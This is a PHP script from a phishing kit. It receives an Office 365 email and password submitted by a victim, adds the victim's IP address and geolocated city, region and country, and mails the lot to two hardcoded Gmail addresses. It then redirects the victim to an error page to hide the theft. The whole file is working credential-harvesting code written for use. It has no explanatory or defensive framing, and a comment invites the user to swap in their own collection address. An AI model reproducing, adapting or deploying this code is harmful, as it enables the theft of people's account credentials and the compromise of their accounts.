<?php
require_once('geoplugin.class.php');
session_start();

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$message .= "--------------OFFICE------------------\n";
$message .= "EMAIL: ".$_SESSION["mail"]."\n";
$message .= "PASS: ".$_POST['passwd']."\n";
$message .= "---------=IP Address & Date=-----------\n";
$message .= "IP Address: ".$ip."\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "---------------JSARZ-------------\n";
//change ur email here
$sent ="daviskyle021@gmail.com,jmbischler@gmail.com";


$subject = "OFFICE 365 Log From - " .$ip;
$headers = "From: BOX OFFICE<customer@floor.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
    
	mail($sent,$subject,$message,$headers);
        
header("Location: opps.html");

?>																					